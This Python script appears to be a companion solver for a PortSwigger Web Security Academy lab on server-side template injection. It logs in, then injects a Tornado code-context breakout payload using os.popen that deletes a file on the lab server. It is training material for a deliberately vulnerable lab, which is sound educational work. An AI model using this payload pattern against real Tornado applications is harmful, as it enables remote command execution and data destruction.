#!/usr/bin/env python3
"""
Basic server-side template injection (code context)
PortSwigger Web Security Academy -- Server-Side Template Injection

Companion script for the writeup: 02-basic-server-side-template-injection-code-context.md

What this does:
    Logs in as wiener:peter, posts a comment on the blog post so the
    preferred-name display actually renders, then sets the
    `blog-post-author-display` preference to a Tornado code-context break-out
    that closes the developer's existing `{{ }}` expression, imports os, and
    invokes `os.popen(...).read()` to run the command. Setting the preference
    alone doesn't render the template -- visiting the blog post again is what
    triggers it.

Usage:
    python 02-basic-server-side-template-injection-code-context.py <lab-url>
    e.g. python 02-basic-server-side-template-injection-code-context.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

POST_ID = "4"
CONTEXT_PREFIX = "user.name"
# Our tool's code-context RCE table for Tornado -- output-capable, unlike
# PortSwigger's fire-and-forget os.system() equivalent.
TORNADO_CODE_CONTEXT_RCE = "}}{% import os %}{{ os.popen('{CMD}').read()"


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url, follow_redirects=True, timeout=15)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not match:
        match = re.search(r'value="([^"]+)"\s+name="csrf"', r.text)
    return match.group(1) if match else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    print("[*] Logging in as wiener:peter")
    csrf = _get_csrf(client, f"{lab_url}/login")
    login_resp = client.post(f"{lab_url}/login",
                              data={"csrf": csrf, "username": "wiener", "password": "peter"})
    if "my-account" not in str(login_resp.url):
        print("[-] Login failed.")
        return
    print("[+] Logged in.")

    print(f"[*] Posting a comment on postId={POST_ID} so the preferred name renders")
    post_csrf = _get_csrf(client, f"{lab_url}/post?postId={POST_ID}")
    client.post(f"{lab_url}/post/comment", data={
        "csrf": post_csrf, "postId": POST_ID,
        "comment": "test", "name": "wiener",
        "email": "w@test.com", "website": "",
    })

    print("[*] Injecting Tornado code-context payload to delete morale.txt")
    payload = CONTEXT_PREFIX + TORNADO_CODE_CONTEXT_RCE.replace(
        "{CMD}", "rm /home/carlos/morale.txt")
    acct_csrf = _get_csrf(client, f"{lab_url}/my-account")
    client.post(f"{lab_url}/my-account/change-blog-post-author-display", data={
        "csrf": acct_csrf,
        "blog-post-author-display": payload,
    })

    print("[*] Reloading the blog post to trigger template rendering")
    client.get(f"{lab_url}/post?postId={POST_ID}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- morale.txt deleted via Tornado code-context RCE.")
    else:
        print("[-] Not solved yet -- inspect the response manually.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
